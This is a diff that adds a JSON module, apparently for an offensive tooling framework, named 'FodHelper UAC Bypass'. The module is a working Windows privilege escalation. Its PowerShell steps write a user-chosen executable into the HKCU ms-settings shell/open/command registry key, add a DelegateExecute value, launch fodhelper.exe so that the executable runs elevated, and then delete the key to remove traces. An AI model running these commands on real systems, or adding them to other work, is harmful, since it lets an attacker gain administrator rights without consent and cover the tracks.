@@ -1,0 +1,34 @@
+{
+  "Name": "FodHelper UAC Bypass",
+  "Command":"uac-bypass-fodhelper",
+  "Description": "UAC Bypass using Fodelper registry key",
+  "Args": [
+    [
+      "EXEC",
+      "str",
+      "Executable to elevate"
+    ]
+  ],
+  "Instructions": [
+    {
+      "type": "command",
+      "data": "New-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Force | Out-Null"
+    },
+    {
+      "type": "command",
+      "data": "Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Name \"(Default)\" -Value \"{EXEC}\""
+    },
+    {
+      "type": "command",
+      "data": "New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -PropertyType String -Force | Out-Null"
+    },
+    {
+      "type": "command",
+      "data": "Start-Process \"C:\\Windows\\System32\\fodhelper.exe\""
+    },
+    {
+      "type": "command",
+      "data": "Remove-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\" -Recurse -Force"
+    }
+  ]
+}
